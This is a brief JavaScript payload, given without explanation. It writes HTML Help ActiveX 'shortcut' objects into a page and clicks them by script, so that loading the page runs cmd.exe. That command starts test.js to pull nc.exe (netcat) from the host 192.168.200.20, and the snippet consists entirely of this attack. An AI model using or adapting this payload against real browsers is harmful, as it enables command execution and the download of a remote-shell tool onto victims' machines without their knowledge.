mystr="<object id=c classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11>"+
      "<param name=command value=shortcut>"+
      "<param name=item1 value=',cmd.exe, /c start /min test.js http://192.168.200.20/nc.exe'>"+
      "</object>"+
      "<object id=d classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11>"+
      "<param name=command value=close>"+
      "</object>"+
      "<script>"+
      	"c.Click\(\);"+
      	"d.Click\(\);"+
      "</script>"
document.write(mystr)